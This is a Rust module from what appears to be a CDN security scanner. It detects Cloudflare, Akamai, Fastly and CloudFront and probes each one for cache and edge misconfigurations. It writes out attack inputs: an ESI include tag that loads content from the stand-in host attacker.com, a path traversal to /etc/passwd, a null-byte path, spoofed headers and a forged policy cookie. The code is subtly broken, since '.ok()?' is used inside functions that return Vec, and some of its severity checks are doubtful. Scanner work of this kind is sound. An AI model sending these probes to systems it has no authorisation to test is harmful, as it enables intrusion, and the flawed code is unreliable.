//! CDN Provider Quirks Module
//! Implements provider-specific checks for Cloudflare, Akamai, Fastly, and CloudFront.

use crate::checks::module::{CheckModule, CheckResult, Severity};
use crate::findings::cache_evidence::CacheEvidence;
use crate::http_client::HttpClient;
use std::collections::HashMap;

/// Cloudflare-specific headers and behaviors
const CLOUDFLARE_HEADERS: &[&str] = &[
    "cf-ray",
    "cf-cache-status",
    "cf-request-id",
    "cf-edge-ip",
];

/// Akamai-specific headers and behaviors
const AKAMAI_HEADERS: &[&str] = &[
    "x-akamai-transformed",
    "x-akamai-request-id",
    "x-akamai-staging",
    "x-checkpoint",
];

/// Fastly-specific headers and behaviors
const FASTLY_HEADERS: &[&str] = &[
    "x-served-by",
    "x-timer",
    "fastly-cache-status",
    "fastly-debug-digest",
    "x-varnish",
];

/// CloudFront-specific headers and behaviors
const CLOUDFRONT_HEADERS: &[&str] = &[
    "x-amz-cf-id",
    "x-amz-cf-pop",
    "x-amz-server-side-encryption",
    "x-amzn-trace-id",
];

pub struct ProviderQuirksChecker {
    http_client: HttpClient,
}

impl ProviderQuirksChecker {
    pub fn new(http_client: HttpClient) -> Self {
        Self { http_client }
    }

    /// Detect which CDN provider is being used
    pub fn detect_provider(&self, headers: &HashMap<String, String>) -> Option<&'static str> {
        // Check Cloudflare indicators
        for header in CLOUDFLARE_HEADERS {
            if headers.contains_key(*header) {
                return Some("Cloudflare");
            }
        }
        
        // Check Akamai indicators
        for header in AKAMAI_HEADERS {
            if headers.contains_key(*header) {
                return Some("Akamai");
            }
        }
        
        // Check Fastly indicators
        for header in FASTLY_HEADERS {
            if headers.contains_key(*header) {
                return Some("Fastly");
            }
        }
        
        // Check CloudFront indicators
        for header in CLOUDFRONT_HEADERS {
            if headers.contains_key(*header) {
                return Some("CloudFront");
            }
        }
        
        None
    }

    /// Test Cloudflare-specific bypasses and misconfigurations
    async fn test_cloudflare_quirks(&self, target: &str) -> Vec<CacheEvidence> {
        let mut findings = Vec::new();
        
        // Test 1: Cache Bypass via Cookie
        let mut headers = HashMap::new();
        headers.insert("Cookie".to_string(), "__cf_bm=test".to_string());
        
        let response = self.http_client.get_with_headers(target, &headers).await.ok()?;
        if let Some(cf_status) = response.headers.get("cf-cache-status") {
            if cf_status == "DYNAMIC" || cf_status == "BYPASS" {
                findings.push(CacheEvidence {
                    url: target.to_string(),
                    vulnerability_type: "cloudflare_cookie_bypass".to_string(),
                    extension_used: "Cookie: __cf_bm=test".to_string(),
                    original_path: target.to_string(),
                    edge_headers: response.headers.clone(),
                    cache_status: response.cache_status.unwrap_or_default(),
                    severity: Severity::Low,
                    description: "Cloudflare cache bypassed via cookie - may allow origin access".to_string(),
                });
            }
        }
        
        // Test 2: Host header with trailing dot (Cloudflare quirk)
        let domain = target.trim_start_matches("https://").trim_start_matches("http://");
        let mut headers = HashMap::new();
        headers.insert("Host".to_string(), format!("{}.", domain));
        
        let response = self.http_client.get_with_headers(target, &headers).await.ok()?;
        if response.status == 200 && !response.body.is_empty() {
            findings.push(CacheEvidence {
                url: target.to_string(),
                vulnerability_type: "cloudflare_host_dot".to_string(),
                extension_used: "Host with trailing dot".to_string(),
                original_path: target.to_string(),
                edge_headers: response.headers.clone(),
                cache_status: response.cache_status.unwrap_or_default(),
                severity: Severity::Medium,
                description: "Cloudflare accepts Host header with trailing dot - potential normalization issue".to_string(),
            });
        }
        
        // Test 3: %00 injection in path (historical Cloudflare issue)
        let null_url = format!("{}%00.css", target);
        let response = self.http_client.get(&null_url).await.ok()?;
        if response.status == 200 {
            findings.push(CacheEvidence {
                url: null_url,
                vulnerability_type: "cloudflare_null_byte".to_string(),
                extension_used: "%00 in path".to_string(),
                original_path: target.to_string(),
                edge_headers: response.headers.clone(),
                cache_status: response.cache_status.unwrap_or_default(),
                severity: Severity::High,
                description: "Cloudflare may process null bytes in paths unexpectedly".to_string(),
            });
        }
        
        findings
    }

    /// Test Akamai-specific bypasses and misconfigurations
    async fn test_akamai_quirks(&self, target: &str) -> Vec<CacheEvidence> {
        let mut findings = Vec::new();
        
        // Test 1: X-Akamai-* header manipulation
        let test_headers = [
            ("X-Akamai-Edge-Result", "origin_error"),
            ("X-Akamai-Staging", "true"),
            ("X-Akamai-Request-Idx", "99999"),
        ];
        
        for (header, value) in &test_headers {
            let mut headers = HashMap::new();
            headers.insert(header.to_string(), value.to_string());
            
            let response = self.http_client.get_with_headers(target, &headers).await.ok()?;
            
            // Check if Akamai responds to these headers
            if response.headers.contains_key("x-akamai-transformed") 
                || response.headers.contains_key("x-checkpoint")
            {
                findings.push(CacheEvidence {
                    url: target.to_string(),
                    vulnerability_type: "akamai_header_injection".to_string(),
                    extension_used: format!("{}: {}", header, value),
                    original_path: target.to_string(),
                    edge_headers: response.headers.clone(),
                    cache_status: response.cache_status.unwrap_or_default(),
                    severity: Severity::Medium,
                    description: format!("Akamai processes {} header - may affect caching behavior", header),
                });
            }
        }
        
        // Test 2: ESI injection (Akamai Edge Side Includes)
        let esi_payload = "<esi:include src=\"http://attacker.com/esi.xml\" />";
        let mut headers = HashMap::new();
        headers.insert("Surrogate-Control".to_string(), "no-store".to_string());
        
        let response = self.http_client.post_with_headers(target, esi_payload, &headers).await.ok()?;
        if response.body.contains("esi:") || response.body.contains("attacker.com") {
            findings.push(CacheEvidence {
                url: target.to_string(),
                vulnerability_type: "akamai_esi_injection".to_string(),
                extension_used: "ESI include tag".to_string(),
                original_path: target.to_string(),
                edge_headers: response.headers.clone(),
                cache_status: response.cache_status.unwrap_or_default(),
                severity: Severity::Critical,
                description: "Potential ESI injection - Akamai may process attacker-controlled ESI tags".to_string(),
            });
        }
        
        findings
    }

    /// Test Fastly-specific bypasses and misconfigurations
    async fn test_fastly_quirks(&self, target: &str) -> Vec<CacheEvidence> {
        let mut findings = Vec::new();
        
        // Test 1: Surrogate-Key manipulation
        let mut headers = HashMap::new();
        headers.insert("Surrogate-Key".to_string(), "custom-key-123".to_string());
        
        let response = self.http_client.get_with_headers(target, &headers).await.ok()?;
        if response.headers.contains_key("x-served-by") 
            && response.headers.get("x-served-by").unwrap().contains("fastly")
        {
            findings.push(CacheEvidence {
                url: target.to_string(),
                vulnerability_type: "fastly_surrogate_key".to_string(),
                extension_used: "Surrogate-Key: custom-key-123".to_string(),
                original_path: target.to_string(),
                edge_headers: response.headers.clone(),
                cache_status: response.cache_status.unwrap_or_default(),
                severity: Severity::Low,
                description: "Fastly accepts client-supplied Surrogate-Key - may affect cache invalidation".to_string(),
            });
        }
        
        // Test 2: Fastly debug headers
        let debug_headers = [
            "Fastly-Debug-Digest",
            "Fastly-Debug-Path",
            "X-Fastly-Debug",
        ];
        
        for debug_header in &debug_headers {
            let mut headers = HashMap::new();
            headers.insert(debug_header.to_string(), "1".to_string());
            
            let response = self.http_client.get_with_headers(target, &headers).await.ok()?;
            
            // Check if debug info is exposed
            if response.body.contains("Fastly") || response.body.contains("varnish") {
                findings.push(CacheEvidence {
                    url: target.to_string(),
                    vulnerability_type: "fastly_debug_exposure".to_string(),
                    extension_used: format!("{}: 1", debug_header),
                    original_path: target.to_string(),
                    edge_headers: response.headers.clone(),
                    cache_status: response.cache_status.unwrap_or_default(),
                    severity: Severity::Medium,
                    description: format!("Fastly debug header {} exposes internal information", debug_header),
                });
            }
        }
        
        findings
    }

    /// Test CloudFront-specific bypasses and misconfigurations
    async fn test_cloudfront_quirks(&self, target: &str) -> Vec<CacheEvidence> {
        let mut findings = Vec::new();
        
        // Test 1: Header spoofing via underscore
        let spoofed_headers = [
            ("X-Amz_Cf_Id", "spoofed_value"),
            ("Http_X_Amz_Cf_Pop", "SPOOFED"),
        ];
        
        for (header, value) in &spoofed_headers {
            let mut headers = HashMap::new();
            headers.insert(header.to_string(), value.to_string());
            
            let response = self.http_client.get_with_headers(target, &headers).await.ok()?;
            
            // Check if CloudFront processes the spoofed header
            if response.headers.contains_key("x-amz-cf-id") {
                findings.push(CacheEvidence {
                    url: target.to_string(),
                    vulnerability_type: "cloudfront_header_spoof".to_string(),
                    extension_used: format!("{}: {}", header, value),
                    original_path: target.to_string(),
                    edge_headers: response.headers.clone(),
                    cache_status: response.cache_status.unwrap_or_default(),
                    severity: Severity::Medium,
                    description: format!("CloudFront may process header with underscore: {}", header),
                });
            }
        }
        
        // Test 2: Lambda@Edge manipulation via cookies
        let mut headers = HashMap::new();
        headers.insert("Cookie".to_string(), "CloudFront-Policy=malicious".to_string());
        
        let response = self.http_client.get_with_headers(target, &headers).await.ok()?;
        if response.status != 403 && response.status != 401 {
            // CloudFront should reject malformed policy cookies
            findings.push(CacheEvidence {
                url: target.to_string(),
                vulnerability_type: "cloudfront_cookie_manipulation".to_string(),
                extension_used: "Malicious CloudFront cookie".to_string(),
                original_path: target.to_string(),
                edge_headers: response.headers.clone(),
                cache_status: response.cache_status.unwrap_or_default(),
                severity: Severity::High,
                description: "CloudFront accepted potentially malicious signed cookie".to_string(),
            });
        }
        
        // Test 3: Origin Path traversal via query string
        let traversal_url = format!("{}?../../../../etc/passwd", target);
        let response = self.http_client.get(&traversal_url).await.ok()?;
        if response.body.contains("root:") || response.body.contains("/bin/bash") {
            findings.push(CacheEvidence {
                url: traversal_url,
                vulnerability_type: "cloudfront_path_traversal".to_string(),
                extension_used: "Path traversal in query".to_string(),
                original_path: target.to_string(),
                edge_headers: response.headers.clone(),
                cache_status: response.cache_status.unwrap_or_default(),
                severity: Severity::Critical,
                description: "CloudFront may allow path traversal via query string parameters".to_string(),
            });
        }
        
        findings
    }

    /// Generate provider-specific remediation recommendations
    pub fn get_provider_remediation(&self, provider: &str) -> &'static str {
        match provider {
            "Cloudflare" => "Enable WAF rules for cache deception. Use Page Rules to control caching. \
                             Configure SSL/TLS encryption mode appropriately.",
            "Akamai" => "Review Property Manager configuration. Validate ESI processing settings. \
                         Implement appropriate cache key configurations.",
            "Fastly" => "Review VCL configuration for security. Disable debug headers in production. \
                         Implement proper surrogate key validation.",
            "CloudFront" => "Configure Origin Access Identity. Use signed URLs/cookies properly. \
                             Implement WAF rules at CloudFront level.",
            _ => "Review CDN configuration for proper cache key settings. \
                  Ensure origin server validates Host headers. \
                  Implement appropriate WAF rules.",
        }
    }
}

#[async_trait::async_trait]
impl CheckModule for ProviderQuirksChecker {
    fn name(&self) -> &'static str {
        "provider_quirks"
    }

    fn description(&self) -> &'static str {
        "Implements provider-specific checks for Cloudflare, Akamai, Fastly, and CloudFront"
    }

    async fn scan(&self, target: &str) -> Vec<CheckResult> {
        let mut results = Vec::new();
        
        // First, detect the provider
        let probe_response = self.http_client.get(target).await.ok();
        let provider = probe_response
            .as_ref()
            .and_then(|r| self.detect_provider(&r.headers))
            .unwrap_or("Unknown");
        
        results.push(CheckResult {
            check_name: self.name(),
            severity: Severity::Info,
            finding: format!("Detected CDN provider: {}", provider),
            evidence: serde_json::json!({"provider": provider}),
            remediation: self.get_provider_remediation(provider).to_string(),
        });
        
        // Run provider-specific tests
        match provider {
            "Cloudflare" => {
                for evidence in self.test_cloudflare_quirks(target).await {
                    results.push(CheckResult {
                        check_name: self.name(),
                        severity: evidence.severity,
                        finding: evidence.description,
                        evidence: serde_json::to_value(&evidence).unwrap_or_default(),
                        remediation: self.get_provider_remediation(provider).to_string(),
                    });
                }
            }
            "Akamai" => {
                for evidence in self.test_akamai_quirks(target).await {
                    results.push(CheckResult {
                        check_name: self.name(),
                        severity: evidence.severity,
                        finding: evidence.description,
                        evidence: serde_json::to_value(&evidence).unwrap_or_default(),
                        remediation: self.get_provider_remediation(provider).to_string(),
                    });
                }
            }
            "Fastly" => {
                for evidence in self.test_fastly_quirks(target).await {
                    results.push(CheckResult {
                        check_name: self.name(),
                        severity: evidence.severity,
                        finding: evidence.description,
                        evidence: serde_json::to_value(&evidence).unwrap_or_default(),
                        remediation: self.get_provider_remediation(provider).to_string(),
                    });
                }
            }
            "CloudFront" => {
                for evidence in self.test_cloudfront_quirks(target).await {
                    results.push(CheckResult {
                        check_name: self.name(),
                        severity: evidence.severity,
                        finding: evidence.description,
                        evidence: serde_json::to_value(&evidence).unwrap_or_default(),
                        remediation: self.get_provider_remediation(provider).to_string(),
                    });
                }
            }
            _ => {
                // Run generic tests for unknown providers
                results.push(CheckResult {
                    check_name: self.name(),
                    severity: Severity::Info,
                    finding: "Unknown CDN provider - running generic checks".to_string(),
                    evidence: serde_json::json!({"note": "Generic CDN checks applied"}),
                    remediation: "Identify CDN provider for specific security recommendations.".to_string(),
                });
            }
        }
        
        results
    }

    fn supported_checks(&self) -> Vec<&'static str> {
        vec![
            "provider_detection",
            "cloudflare_quirks",
            "akamai_quirks",
            "fastly_quirks",
            "cloudfront_quirks",
        ]
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_provider_headers_defined() {
        assert!(!CLOUDFLARE_HEADERS.is_empty());
        assert!(!AKAMAI_HEADERS.is_empty());
        assert!(!FASTLY_HEADERS.is_empty());
        assert!(!CLOUDFRONT_HEADERS.is_empty());
    }

    #[test]
    fn test_detect_provider_cloudflare() {
        let checker = ProviderQuirksChecker::new(HttpClient::default());
        let mut headers = HashMap::new();
        headers.insert("cf-ray".to_string(), "12345".to_string());
        
        assert_eq!(checker.detect_provider(&headers), Some("Cloudflare"));
    }

    #[test]
    fn test_detect_provider_fastly() {
        let checker = ProviderQuirksChecker::new(HttpClient::default());
        let mut headers = HashMap::new();
        headers.insert("x-served-by".to_string(), "fastly".to_string());
        
        assert_eq!(checker.detect_provider(&headers), Some("Fastly"));
    }
}
